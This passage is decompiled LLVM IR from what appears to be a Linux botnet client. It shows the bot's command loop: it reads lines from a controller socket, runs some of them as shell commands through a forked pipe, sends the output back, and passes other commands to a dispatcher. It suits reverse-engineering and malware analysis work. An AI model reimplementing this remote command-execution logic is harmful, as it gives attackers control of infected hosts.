dec_label_pc_8050c9d:                             ; preds = %dec_label_pc_8050c48
  store i32 %v2_8051093, i32* %stack_var_-5888, align 4
  %v4_8050cae = call i32 @strstr(i32 %v2_8051093, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059bdf.459, i32 0, i32 0))
  store i32 %v4_8050cae, i32* @edx, align 4
  %v7_8050cbb = icmp ult i32 %v4_8050cae, %v2_8051093
  store i1 %v7_8050cbb, i1* %cf.global-to-local, align 1
  %v12_8050cbb = icmp eq i32 %v4_8050cae, %v2_8051093
  %v1_8050cbd = icmp eq i1 %v12_8050cbb, false
  br i1 %v1_8050cbd, label %dec_label_pc_8050ce5, label %dec_label_pc_8050cbf

dec_label_pc_8050cbf:                             ; preds = %dec_label_pc_8050c9d
  %v4_8050cbf = add i32 %stack_var_-96.2.ph, 1
  store i32 ptrtoint ([20 x i8]* @global_var_8059be3.460 to i32), i32* %stack_var_-5888, align 4
  %v1_8050cca = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_8059be3.460 to i32))
  store i32 %v1_8050cca, i32* @eax, align 4
  %v9_8050ccf = icmp ult i32 %v4_8050cbf, 20
  store i1 %v9_8050ccf, i1* %cf.global-to-local, align 1
  %v7_8050cd3 = icmp sgt i32 %v4_8050cbf, 20
  br i1 %v7_8050cd3, label %dec_label_pc_8050cd9, label %dec_label_pc_80509dd.outer

dec_label_pc_8050cd9:                             ; preds = %dec_label_pc_8050cbf
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_8050ce0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8050ce5

dec_label_pc_8050ce5:                             ; preds = %dec_label_pc_8050c9d, %dec_label_pc_8050cd9
  %stack_var_-96.1 = phi i32 [ %stack_var_-96.2.ph, %dec_label_pc_8050c9d ], [ %v4_8050cbf, %dec_label_pc_8050cd9 ]
  %v2_8050cf1 = load i8, i8* %tmp121, align 4
  %v6_8050cf4 = icmp ult i8 %v2_8050cf1, 33
  store i1 %v6_8050cf4, i1* %cf.global-to-local, align 1
  %v10_8050cf4 = icmp eq i8 %v2_8050cf1, 33
  %v1_8050cf6 = icmp eq i1 %v10_8050cf4, false
  br i1 %v1_8050cf6, label %dec_label_pc_8051093.outer, label %dec_label_pc_8050cfc

dec_label_pc_8050cfc:                             ; preds = %dec_label_pc_8050ce5
  %v2_8050d0b128 = load i8, i8* %storemerge13127, align 1
  %v3_8050d0e131 = icmp ult i8 %v2_8050d0b128, 32
  store i1 %v3_8050d0e131, i1* %cf.global-to-local, align 1
  %v7_8050d0e135 = icmp eq i8 %v2_8050d0b128, 32
  br i1 %v7_8050d0e135, label %dec_label_pc_8050d1c, label %dec_label_pc_8050d12

dec_label_pc_8050d05:                             ; preds = %dec_label_pc_8050d12
  %v5_8050d05 = add i32 %storemerge13.in137, 1
  %storemerge13 = inttoptr i32 %v5_8050d05 to i8*
  %v2_8050d0b = load i8, i8* %storemerge13, align 1
  %v3_8050d0e = icmp ult i8 %v2_8050d0b, 32
  store i1 %v3_8050d0e, i1* %cf.global-to-local, align 1
  %v7_8050d0e = icmp eq i8 %v2_8050d0b, 32
  br i1 %v7_8050d0e, label %dec_label_pc_8050d1c, label %dec_label_pc_8050d12

dec_label_pc_8050d12:                             ; preds = %dec_label_pc_8050cfc, %dec_label_pc_8050d05
  %storemerge13138 = phi i8* [ %storemerge13, %dec_label_pc_8050d05 ], [ %storemerge13127, %dec_label_pc_8050cfc ]
  %storemerge13.in137 = phi i32 [ %v5_8050d05, %dec_label_pc_8050d05 ], [ %v1_8050cff, %dec_label_pc_8050cfc ]
  %v2_8050d15 = load i8, i8* %storemerge13138, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050d18 = icmp eq i8 %v2_8050d15, 0
  %v1_8050d1a = icmp eq i1 %v4_8050d18, false
  br i1 %v1_8050d1a, label %dec_label_pc_8050d05, label %dec_label_pc_8050d1c

dec_label_pc_8050d1c:                             ; preds = %dec_label_pc_8050d05, %dec_label_pc_8050d12, %dec_label_pc_8050cfc
  %storemerge13.lcssa = phi i8* [ %storemerge13127, %dec_label_pc_8050cfc ], [ %storemerge13138, %dec_label_pc_8050d12 ], [ %storemerge13, %dec_label_pc_8050d05 ]
  %v2_8050d1f = load i8, i8* %storemerge13.lcssa, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050d22 = icmp eq i8 %v2_8050d1f, 0
  br i1 %v4_8050d22, label %dec_label_pc_8051093.outer, label %dec_label_pc_8050d2a

dec_label_pc_8050d2a:                             ; preds = %dec_label_pc_8050d1c
  store i8 0, i8* %storemerge13.lcssa, align 1
  %v3_8050d4e = call i32 @_strlen(i8* %storemerge13127)
  %v6_8050d55 = add i32 %v2_8051093, %v3_8050d4e
  %v1_8050d58 = add i32 %v6_8050d55, 2
  %v5_8050d58 = icmp ugt i32 %v6_8050d55, -3
  store i1 %v5_8050d58, i1* %cf.global-to-local, align 1
  %v5_8050d5b = inttoptr i32 %v1_8050d58 to i8*
  br label %dec_label_pc_8050d85

dec_label_pc_8050d60:                             ; preds = %dec_label_pc_8050dae, %dec_label_pc_8050d85
  %v3_8050d77 = call i32 @_strlen(i8* %v5_8050d5b)
  %v4_8050d77 = mul i32 %v3_8050d77, -1
  %v1_8050d7d = sub i32 0, %v4_8050d77
  %v6_8050d7e = sub i32 %v1_8050d58, %v4_8050d77
  %v11_8050d7e = icmp ult i32 %v6_8050d7e, %v1_8050d7d
  store i1 %v11_8050d7e, i1* %cf.global-to-local, align 1
  %v1_8050d81 = add i32 %v6_8050d7e, -1
  %v1_8050d82 = inttoptr i32 %v1_8050d81 to i8*
  store i8 0, i8* %v1_8050d82, align 1
  br label %dec_label_pc_8050d85

dec_label_pc_8050d85:                             ; preds = %dec_label_pc_8050d2a, %dec_label_pc_8050d60
  %v3_8050d9c = call i32 @_strlen(i8* %v5_8050d5b)
  %v4_8050d9c = mul i32 %v3_8050d9c, -1
  %v1_8050da2 = sub i32 0, %v4_8050d9c
  %v6_8050da3 = sub i32 %v1_8050d58, %v4_8050d9c
  %v11_8050da3 = icmp ult i32 %v6_8050da3, %v1_8050da2
  store i1 %v11_8050da3, i1* %cf.global-to-local, align 1
  %v1_8050da6 = add i32 %v6_8050da3, -1
  %v1_8050da7 = inttoptr i32 %v1_8050da6 to i8*
  %v2_8050da7 = load i8, i8* %v1_8050da7, align 1
  %v6_8050daa = icmp ult i8 %v2_8050da7, 10
  store i1 %v6_8050daa, i1* %cf.global-to-local, align 1
  %v10_8050daa = icmp eq i8 %v2_8050da7, 10
  br i1 %v10_8050daa, label %dec_label_pc_8050d60, label %dec_label_pc_8050dae

dec_label_pc_8050dae:                             ; preds = %dec_label_pc_8050d85
  %v3_8050dc5 = call i32 @_strlen(i8* %v5_8050d5b)
  %v4_8050dc5 = mul i32 %v3_8050dc5, -1
  %v1_8050dcb = sub i32 0, %v4_8050dc5
  %v6_8050dcc = sub i32 %v1_8050d58, %v4_8050dc5
  %v11_8050dcc = icmp ult i32 %v6_8050dcc, %v1_8050dcb
  store i1 %v11_8050dcc, i1* %cf.global-to-local, align 1
  %v1_8050dcf = add i32 %v6_8050dcc, -1
  %v1_8050dd0 = inttoptr i32 %v1_8050dcf to i8*
  %v2_8050dd0 = load i8, i8* %v1_8050dd0, align 1
  %v6_8050dd3 = icmp ult i8 %v2_8050dd0, 13
  store i1 %v6_8050dd3, i1* %cf.global-to-local, align 1
  %v10_8050dd3 = icmp eq i8 %v2_8050dd0, 13
  br i1 %v10_8050dd3, label %dec_label_pc_8050d60, label %dec_label_pc_8050dd7

dec_label_pc_8050dd7:                             ; preds = %dec_label_pc_8050dae
  %v2_8050de5143 = load i8, i8* %v5_8050d5b, align 1
  %v3_8050de8146 = icmp ult i8 %v2_8050de5143, 32
  store i1 %v3_8050de8146, i1* %cf.global-to-local, align 1
  %v7_8050de8150 = icmp eq i8 %v2_8050de5143, 32
  br i1 %v7_8050de8150, label %dec_label_pc_8050df6, label %dec_label_pc_8050dec

dec_label_pc_8050ddf:                             ; preds = %dec_label_pc_8050dec
  %v5_8050ddf = add i32 %v4_8050de2153, 1
  %v22_8050ddf = inttoptr i32 %v5_8050ddf to i8*
  %v2_8050de5 = load i8, i8* %v22_8050ddf, align 1
  %v3_8050de8 = icmp ult i8 %v2_8050de5, 32
  store i1 %v3_8050de8, i1* %cf.global-to-local, align 1
  %v7_8050de8 = icmp eq i8 %v2_8050de5, 32
  br i1 %v7_8050de8, label %dec_label_pc_8050df6, label %dec_label_pc_8050dec

dec_label_pc_8050dec:                             ; preds = %dec_label_pc_8050dd7, %dec_label_pc_8050ddf
  %v4_8050de2153 = phi i32 [ %v5_8050ddf, %dec_label_pc_8050ddf ], [ %v1_8050d58, %dec_label_pc_8050dd7 ]
  %stack_var_-64.0152 = phi i8* [ %v22_8050ddf, %dec_label_pc_8050ddf ], [ %v5_8050d5b, %dec_label_pc_8050dd7 ]
  %v2_8050def = load i8, i8* %stack_var_-64.0152, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050df2 = icmp eq i8 %v2_8050def, 0
  %v1_8050df4 = icmp eq i1 %v4_8050df2, false
  br i1 %v1_8050df4, label %dec_label_pc_8050ddf, label %dec_label_pc_8050df6

dec_label_pc_8050df6:                             ; preds = %dec_label_pc_8050ddf, %dec_label_pc_8050dec, %dec_label_pc_8050dd7
  %stack_var_-64.0.lcssa = phi i8* [ %v5_8050d5b, %dec_label_pc_8050dd7 ], [ %stack_var_-64.0152, %dec_label_pc_8050dec ], [ %v22_8050ddf, %dec_label_pc_8050ddf ]
  %v4_8050de2.lcssa = phi i32 [ %v1_8050d58, %dec_label_pc_8050dd7 ], [ %v4_8050de2153, %dec_label_pc_8050dec ], [ %v5_8050ddf, %dec_label_pc_8050ddf ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v5_8050dfc = add i32 %v4_8050de2.lcssa, 1
  %v2_8050e25159 = load i8, i8* %v5_8050d5b, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050e28161 = icmp eq i8 %v2_8050e25159, 0
  %v1_8050e2a163 = icmp eq i1 %v4_8050e28161, false
  br i1 %v1_8050e2a163, label %dec_label_pc_8050e07, label %dec_label_pc_8050e2c

dec_label_pc_8050e07:                             ; preds = %dec_label_pc_8050df6, %dec_label_pc_8050e07
  %storemerge12165 = phi i8* [ %storemerge12, %dec_label_pc_8050e07 ], [ %v5_8050d5b, %dec_label_pc_8050df6 ]
  %storemerge12.in164 = phi i32 [ %v5_8050e1f, %dec_label_pc_8050e07 ], [ %v1_8050d58, %dec_label_pc_8050df6 ]
  %v2_8050e0a = load i8, i8* %storemerge12165, align 1
  %v3_8050e0a = zext i8 %v2_8050e0a to i32
  store i32 %v3_8050e0a, i32* %stack_var_-5888, align 4
  %v1_8050e13 = call i32 @__GI_toupper(i32 %v3_8050e0a)
  %v1_8050e18 = urem i32 %v1_8050e13, 256
  %v2_8050e18 = load i32, i32* @edx, align 4
  %v3_8050e18 = and i32 %v2_8050e18, -256
  %v4_8050e18 = or i32 %v3_8050e18, %v1_8050e18
  store i32 %v4_8050e18, i32* @edx, align 4
  %v1_8050e1d = trunc i32 %v1_8050e13 to i8
  store i8 %v1_8050e1d, i8* %storemerge12165, align 1
  %v5_8050e1f = add i32 %storemerge12.in164, 1
  %storemerge12 = inttoptr i32 %v5_8050e1f to i8*
  %v2_8050e25 = load i8, i8* %storemerge12, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050e28 = icmp eq i8 %v2_8050e25, 0
  %v1_8050e2a = icmp eq i1 %v4_8050e28, false
  br i1 %v1_8050e2a, label %dec_label_pc_8050e07, label %dec_label_pc_8050e2c

dec_label_pc_8050e2c:                             ; preds = %dec_label_pc_8050e07, %dec_label_pc_8050df6
  store i1 false, i1* @df, align 1
  store i32 %v1_8050d58, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8059bf7.461 to i32), i32* @edi, align 4
  %v7_8050e5c = call i32 @_strncmp(i8* %v5_8050d5b, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8059bf7.461, i32 0, i32 0), i32 3)
  %v8_8050e5c = urem i32 %v7_8050e5c, 2
  %v9_8050e5c = icmp eq i32 %v8_8050e5c, 0
  %v0_8050e5e = load i1, i1* %cf.global-to-local, align 1
  %v2_8050e5e = or i1 %v0_8050e5e, %v9_8050e5c
  %v3_8050e5e = zext i1 %v2_8050e5e to i32
  %v4_8050e5e = load i32, i32* @edx, align 4
  %v5_8050e5e = and i32 %v4_8050e5e, -256
  %v6_8050e5e = or i32 %v3_8050e5e, %v5_8050e5e
  %v7_8050e5e = xor i32 %v6_8050e5e, 1
  store i32 %v7_8050e5e, i32* @edx, align 4
  %v3_8050e64 = and i32 %v7_8050e5c, -256
  %v1_8050e66 = trunc i32 %v7_8050e5e to i8
  %v3_8050e66 = zext i1 %v0_8050e5e to i8
  %v4_8050e66 = sub nsw i8 %v1_8050e66, %v3_8050e66
  %v15_8050e66 = icmp eq i8 %v4_8050e66, 0
  %v20_8050e66 = zext i8 %v4_8050e66 to i32
  %v23_8050e66 = or i32 %v20_8050e66, %v3_8050e64
  store i32 %v23_8050e66, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050e6f = icmp eq i1 %v15_8050e66, false
  br i1 %v1_8050e6f, label %dec_label_pc_8050f70, label %dec_label_pc_8050e75

dec_label_pc_8050e75:                             ; preds = %dec_label_pc_8050e2c
  %v0_8050e75 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050e7a = icmp eq i32 %v0_8050e75, 0
  %v1_8050e7c = icmp eq i1 %v1_8050e7a, false
  br i1 %v1_8050e7c, label %dec_label_pc_8051093.outer, label %dec_label_pc_8050e82

dec_label_pc_8050e82:                             ; preds = %dec_label_pc_8050e75
  store i32 %v2_8050e82, i32* %stack_var_-5888, align 4
  %v5_8050e9e = call i32 @__GI_memset(i8* %v4_8050e9e, i32 0, i32 1024)
  store i32 %v2_8050e82, i32* %stack_var_-5888, align 4
  %v4_8050ebc = call i32 @szprintf(i32 %v2_8050e82, i32 ptrtoint ([8 x i8]* @global_var_8059bfa.462 to i32), i32 %v5_8050dfc)
  store i32 %v2_8050e82, i32* %stack_var_-5888, align 4
  %v4_8050ed3 = call i32 @fdpopen(i32 %v2_8050e82, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8059ba6.451, i32 0, i32 0))
  store i32 %v2_8050e82, i32* %stack_var_-5888, align 4
  %v4_8050f50166 = call i32 @fdgets(i32 %v2_8050e82, i32 1024, i32 %v4_8050ed3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050f55167 = icmp eq i32 %v4_8050f50166, 0
  %v1_8050f57169 = icmp eq i1 %v1_8050f55167, false
  br i1 %v1_8050f57169, label %dec_label_pc_8050edd, label %dec_label_pc_8050f59

dec_label_pc_8050edd:                             ; preds = %dec_label_pc_8050e82, %dec_label_pc_8050edd
  store i32 %v2_8050e82, i32* %stack_var_-5888, align 4
  %v2_8050ee6 = call i32 @trim(i8* %v4_8050e9e)
  %v0_8050eeb = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_8050eeb, i32* %stack_var_-5888, align 4
  %v3_8050f06 = call i32 @sockprintf(i32 %v0_8050eeb, i32 ptrtoint ([3 x i8]* @global_var_8059c02.463 to i32))
  store i32 %v2_8050e82, i32* %stack_var_-5888, align 4
  %v5_8050f27 = call i32 @__GI_memset(i8* %v4_8050e9e, i32 0, i32 1024)
  store i32 1, i32* %stack_var_-5888, align 4
  %v1_8050f33 = call i32 @sleep(i32 1)
  store i32 %v2_8050e82, i32* %stack_var_-5888, align 4
  %v4_8050f50 = call i32 @fdgets(i32 %v2_8050e82, i32 1024, i32 %v4_8050ed3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050f55 = icmp eq i32 %v4_8050f50, 0
  %v1_8050f57 = icmp eq i1 %v1_8050f55, false
  br i1 %v1_8050f57, label %dec_label_pc_8050edd, label %dec_label_pc_8050f59

dec_label_pc_8050f59:                             ; preds = %dec_label_pc_8050edd, %dec_label_pc_8050e82
  store i32 %v4_8050ed3, i32* %stack_var_-5888, align 4
  %v1_8050f5f = call i32 @fdpclose(i32 %v4_8050ed3)
  store i32 %v1_8050f5f, i32* @eax, align 4
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_8050f6b = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8050f70

dec_label_pc_8050f70:                             ; preds = %dec_label_pc_8050e2c, %dec_label_pc_8050f59
  store i32 %v5_8050dfc, i32* @eax, align 4
  store i32 %v5_8050dfc, i32* %stack_var_-5888, align 4
  %v3_8050f85 = call i32 @__GI_strtok(i32 %v5_8050dfc, i32 ptrtoint (i32* @global_var_8059c05.464 to i32))
  %v5_8050f8a = inttoptr i32 %v3_8050f85 to i8*
  store i8* %v5_8050f8a, i8** %stack_var_-36, align 4
  store i32 %v1_8050d58, i32* %stack_var_-624, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_805104134 = icmp eq i32 %v3_8050f85, 0
  %v1_805104541 = icmp eq i1 %v5_805104134, false
  br i1 %v1_805104541, label %dec_label_pc_8050f9b, label %dec_label_pc_805104b

dec_label_pc_8050f9b:                             ; preds = %dec_label_pc_8050f70, %dec_label_pc_805102a
  %v3_8050fac = phi i8* [ %tmp124, %dec_label_pc_805102a ], [ %v5_8050f8a, %dec_label_pc_8050f70 ]
  %stack_var_-40.142 = phi i32 [ %stack_var_-40.0, %dec_label_pc_805102a ], [ 1, %dec_label_pc_8050f70 ]
  %v2_8050f9e = load i8, i8* %v3_8050fac, align 1
  %v3_8050f9e = zext i8 %v2_8050f9e to i32
  store i32 %v3_8050f9e, i32* @eax, align 4
  %v6_8050fa1 = icmp ult i8 %v2_8050f9e, 10
  store i1 %v6_8050fa1, i1* %cf.global-to-local, align 1
  %v10_8050fa1 = icmp eq i8 %v2_8050f9e, 10
  br i1 %v10_8050fa1, label %dec_label_pc_805102a, label %dec_label_pc_8050fa9

dec_label_pc_8050fa9:                             ; preds = %dec_label_pc_8050f9b
  %v4_8050f9b = ptrtoint i8* %v3_8050fac to i32
  store i32 %stack_var_-40.142, i32* @ebx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050f9b, i32* @edi, align 4
  %v3_8050fc3 = call i32 @_strlen(i8* %v3_8050fac)
  %v1_8050fc7 = add i32 %v3_8050fc3, 1
  store i32 %v1_8050fc7, i32* %stack_var_-5888, align 4
  %v1_8050fce = call i32 @malloc(i32 %v1_8050fc7)
  %v1_8050fd3 = load i32, i32* @ebp, align 4
  %v2_8050fd3 = load i32, i32* @ebx, align 4
  %v3_8050fd3 = mul i32 %v2_8050fd3, 4
  %v4_8050fd3 = add i32 %v1_8050fd3, -616
  %v5_8050fd3 = add i32 %v4_8050fd3, %v3_8050fd3
  %v6_8050fd3 = inttoptr i32 %v5_8050fd3 to i32*
  store i32 %v1_8050fce, i32* %v6_8050fd3, align 4
  %v3_8050fda = load i8*, i8** %stack_var_-36, align 4
  %v4_8050fda = ptrtoint i8* %v3_8050fda to i32
  %v3_8050ff1 = call i32 @_strlen(i8* %v3_8050fda)
  %v1_8050ff5 = add i32 %v3_8050ff1, 1
  %v0_8050ffe = load i32, i32* @ebp, align 4
  %v2_8050ffe = mul i32 %stack_var_-40.142, 4
  %v3_8050ffe = add i32 %v2_8050ffe, -616
  %v4_8050ffe = add i32 %v0_8050ffe, %v3_8050ffe
  %v5_8050ffe = inttoptr i32 %v4_8050ffe to i32*
  %v6_8050ffe = load i32, i32* %v5_8050ffe, align 4
  %v1_8051005 = inttoptr i32 %v6_8050ffe to i8*
  store i32 %v6_8050ffe, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_805100a = and i32 %v6_8050ffe, -256
  %v5_805100c = call i8* @_memset(i8* %v1_8051005, i32 %v1_805100a, i32 %v1_8050ff5)
  %v6_805100c = ptrtoint i8* %v5_805100c to i32
  store i32 %v6_805100c, i32* @ecx, align 4
  %v0_8051014 = load i32, i32* @ebp, align 4
  %v4_8051014 = add i32 %v0_8051014, %v3_8050ffe
  %v5_8051014 = inttoptr i32 %v4_8051014 to i32*
  %v6_8051014 = load i32, i32* %v5_8051014, align 4
  store i32 %v6_8051014, i32* @eax, align 4
  store i32 %v6_8051014, i32* %stack_var_-5888, align 4
  %v3_8051022 = inttoptr i32 %v6_8051014 to i8*
  %v4_8051022 = call i32 @strcpy(i8* %v3_8051022, i32 %v4_8050fda)
  store i32 %v4_8051022, i32* @eax, align 4
  %v4_8051027 = add i32 %stack_var_-40.142, 1
  br label %dec_label_pc_805102a

dec_label_pc_805102a:                             ; preds = %dec_label_pc_8050f9b, %dec_label_pc_8050fa9
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.142, %dec_label_pc_8050f9b ], [ %v4_8051027, %dec_label_pc_8050fa9 ]
  store i32 0, i32* %stack_var_-5888, align 4
  %v3_8051039 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8059c05.464 to i32))
  store i32 %v3_8051039, i32* %tmp122, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_8051041 = icmp eq i32 %v3_8051039, 0
  %v1_8051045 = icmp eq i1 %v5_8051041, false
  %tmp124 = inttoptr i32 %v3_8051039 to i8*
  br i1 %v1_8051045, label %dec_label_pc_8050f9b, label %dec_label_pc_805104b

dec_label_pc_805104b:                             ; preds = %dec_label_pc_805102a, %dec_label_pc_8050f70
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_8050f70 ], [ %stack_var_-40.0, %dec_label_pc_805102a ]
  store i32 %stack_var_-40.1.lcssa, i32* %stack_var_-5888, align 4
  %v4_805105b = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v9_8051060 = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_8051060, i1* %cf.global-to-local, align 1
  %v7_8051064 = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_8051064, label %dec_label_pc_8051076.lr.ph, label %dec_label_pc_8051093.outer

dec_label_pc_8051076.lr.ph:                       ; preds = %dec_label_pc_805104b
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8051076

dec_label_pc_8051076:                             ; preds = %dec_label_pc_8051076.lr.ph, %dec_label_pc_8051076
  %storemerge179 = phi i32 [ 1, %dec_label_pc_8051076.lr.ph ], [ %v4_8051088, %dec_label_pc_8051076 ]
  %v0_8051079 = load i32, i32* @ebp, align 4
  %v2_8051079 = mul i32 %storemerge179, 4
  %v3_8051079 = add i32 %v2_8051079, -616
  %v4_8051079 = add i32 %v3_8051079, %v0_8051079
  %v5_8051079 = inttoptr i32 %v4_8051079 to i32*
  %v6_8051079 = load i32, i32* %v5_8051079, align 4
  store i32 %v6_8051079, i32* %stack_var_-5888, align 4
  %v1_8051083 = call i32 @free(i32 %v6_8051079)
  %v4_8051088 = add nuw i32 %storemerge179, 1
  %v10_805108e = icmp ult i32 %v4_8051088, %stack_var_-40.1.lcssa
  store i1 %v10_805108e, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8051088, %stack_var_-40.1.lcssa
  br i1 %exitcond, label %dec_label_pc_8051093.outer, label %dec_label_pc_8051076

dec_label_pc_8051093.outer:                       ; preds = %dec_label_pc_8051076, %dec_label_pc_8050e75, %dec_label_pc_805104b, %dec_label_pc_8050d1c, %dec_label_pc_8050ce5, %dec_label_pc_80509f4
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_80509f4 ], [ %stack_var_-96.1, %dec_label_pc_8050ce5 ], [ %stack_var_-96.1, %dec_label_pc_8050d1c ], [ %stack_var_-96.1, %dec_label_pc_805104b ], [ %stack_var_-96.1, %dec_label_pc_8050e75 ], [ %stack_var_-96.1, %dec_label_pc_8051076 ]
  br label %dec_label_pc_8051093

dec_label_pc_8051093:                             ; preds = %dec_label_pc_8051093.outer, %dec_label_pc_8050c83
  %v0_8051099 = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_8051099, i32* %stack_var_-5888, align 4
  %v5_80510ae = call i32 @recvLine(i32 %v0_8051099, i8* %tmp121, i32 4096)
  %v8_80510b6 = icmp ne i32 %v5_80510ae, -1
  store i1 %v8_80510b6, i1* %cf.global-to-local, align 1
  %v13_80510b6 = icmp eq i32 %v5_80510ae, -1
  %v1_80510ba = icmp eq i1 %v13_80510b6, false
  br i1 %v1_80510ba, label %dec_label_pc_8050bee, label %dec_label_pc_80509dd.outer

; uselistorder directives
  uselistorder i32 %v5_80510ae, { 0, 2, 1 }
  uselistorder i32 %stack_var_-96.2.ph, { 0, 2, 1 }
  uselistorder i32 %v4_8051088, { 1, 0, 2 }
  uselistorder i32 %storemerge179, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v1_8050fc7, { 1, 0 }
  uselistorder i32 %stack_var_-40.142, { 0, 3, 2, 1 }
  uselistorder i8* %v3_8050fac, { 2, 1, 0 }
  uselistorder i32 %v4_8050ed3, { 2, 1, 3, 0 }
  uselistorder i1 %v0_8050e5e, { 1, 0 }
  uselistorder i32 %v7_8050e5c, { 1, 0 }
  uselistorder i8* %storemerge12, { 1, 0 }
  uselistorder i32 %v5_8050e1f, { 1, 0 }
  uselistorder i32 %v1_8050e13, { 1, 0 }
  uselistorder i8* %storemerge12165, { 1, 0 }
  uselistorder i32 %v6_8050dcc, { 1, 0 }
  uselistorder i32 %v6_8050da3, { 1, 0 }
  uselistorder i32 %v6_8050d7e, { 1, 0 }
  uselistorder i8* %v5_8050d5b, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_8050d58, { 4, 5, 0, 1, 2, 6, 7, 3, 8 }
  uselistorder i32 %v6_8050d55, { 1, 0 }
  uselistorder i8* %storemerge13.lcssa, { 1, 0 }
  uselistorder i32 %v4_8050cbf, { 1, 2, 3, 0 }
  uselistorder i32 %storemerge14, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v0_8050b94, { 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0, 2 }
  uselistorder i32 %v2_8050b61, { 1, 0 }
  uselistorder i32 %v1_8050b4d, { 1, 0 }
  uselistorder i32 %v2_8050b44, { 1, 0 }
  uselistorder i32 %v0_8050b19, { 1, 0 }
  uselistorder i32 %v0_8050abe, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 2, 0, 3 }
  uselistorder i8* %storemerge13127, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8050e82, { 5, 4, 2, 3, 0, 1, 7, 6, 9, 8, 10 }
  uselistorder i8* %tmp121, { 2, 0, 1 }
  uselistorder i32 %v2_8051093, { 2, 0, 4, 6, 5, 1, 7, 9, 8, 10, 3 }
  uselistorder i32 %v1_8050940, { 1, 0, 2 }
  uselistorder i32 %v3_80508f3, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_8050898, { 0, 2, 1 }
  uselistorder i32 %v2_8050879, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v7_805081c, { 1, 0 }
  uselistorder i32 %v2_80507db, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 7, 6, 5, 1, 0, 3, 2, 4, 8 }
  uselistorder i32* %stack_var_-5888, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 38, 39, 36, 37, 2, 1, 40, 42, 43, 44, 41, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i8** %stack_var_-36, { 2, 1, 0 }
  uselistorder i1* %cf.global-to-local, { 31, 1, 55, 2, 5, 4, 56, 6, 54, 7, 8, 52, 9, 53, 10, 11, 51, 12, 13, 15, 16, 14, 17, 18, 19, 20, 50, 21, 22, 23, 24, 25, 26, 30, 3, 27, 28, 29, 32, 0, 48, 33, 49, 34, 35, 36, 37, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 7, 0, 6, 1, 5, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 108, 107, 106, 105, 104, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 